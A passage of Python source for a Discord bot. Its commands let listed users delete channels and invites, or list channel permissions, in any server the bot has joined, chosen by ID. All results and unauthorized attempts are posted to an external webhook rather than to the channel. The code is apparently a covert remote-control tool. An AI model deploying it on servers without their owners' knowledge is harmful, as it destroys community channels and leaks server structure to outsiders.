                chunks.append(current_chunk)
                current_chunk = line
        if current_chunk:
            chunks.append(current_chunk)
        for chunk in chunks:
            webhook_data = {"content": f"Channel IDs and Names for server {server.name}:\n{chunk}"}
            response = requests.post(WEBHOOK_URL, json=webhook_data)
            if response.status_code == 204:
                message = f"Channel IDs and Names for server {server.name} sent to webhook."
                response = requests.post(WEBHOOK_URL, json={'content': message})
            else:
                message = f"Failed to send data to webhook (HTTP {response.status_code})."
                response = requests.post(WEBHOOK_URL, json={'content': message})
    else:
        message = f"Server not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def deletechannel(ctx, server_id, channel_id):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(int(server_id))
        channel = discord.utils.get(server.text_channels, id=int(channel_id))
        if channel:
            await channel.delete()
            message = f"Channel {channel.name} has been deleted."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Channel not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except Exception as e:
        message = f"An error occurred: {e}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def deleteinvite(ctx, server_id, invite_code):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(int(server_id))
        invite = await server.invites()
        for i in invite:
            if i.code == invite_code:
                await i.delete()
                message = f"Deleted invite with code {invite_code}"
                response = requests.post(WEBHOOK_URL, json={'content': message})
                break
        else:
            message = f"Invite code not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except Exception as e:
        message = f"An error occurred: {str(e)}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listchannelperms(ctx, server_id: int, channel_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        message = f"Server with ID {server_id} not found. Make sure the bot is in the server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    channel = server.get_channel(channel_id)
    if not channel:
        message = f"Channel with ID {channel_id} not found in server {server.name} ({server.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    permissions = channel.overwrites
    permission_message = []
    for target, overwrite in permissions.items():
        if isinstance(target, discord.Role):
            role_permissions = []
            for perm, value in overwrite:
                role_permissions.append(f"{perm}: {value}")
            role_permission_str = "\n".join(role_permissions)
            if len("\n".join(permission_message)) + len(role_permission_str) <= 2000:
                permission_message.append(f"Permissions for {target.name} ({target.id}):\n```{role_permission_str}```")
            else:
                message = f"**Channel Permissions for {channel.name} (ID: {channel.id}) in {server.name} ({server.id})**\n" + "\n".join(permission_message)
                response = requests.post(WEBHOOK_URL, json={'content': message})
                permission_message = [f"Permissions for {target.name} ({target.id}):\n```{role_permission_str}```"]
        elif isinstance(target, discord.Member):
            member_permissions = []
            for perm, value in overwrite:
                member_permissions.append(f"{perm}: {value}")
            member_permission_str = "\n".join(member_permissions)
            if len("\n".join(permission_message)) + len(member_permission_str) <= 2000:
                permission_message.append(f"Permissions for {target.display_name} ({target.id}):\n```{member_permission_str}```")
            else:
                message = f"**Channel Permissions for {channel.name} (ID: {channel.id}) in {server.name} ({server.id})**\n" + "\n".join(permission_message)
                response = requests.post(WEBHOOK_URL, json={'content': message})
                permission_message = [f"Permissions for {target.display_name} ({target.id}):\n```{member_permission_str}```"]
    if permission_message:
        message = f"**Channel Permissions for {channel.name} (ID: {channel.id}) in {server.name} ({server.id})**\n" + "\n".join(permission_message)
        response = requests.post(WEBHOOK_URL, json={'content': message})
bot.run(TOKEN)
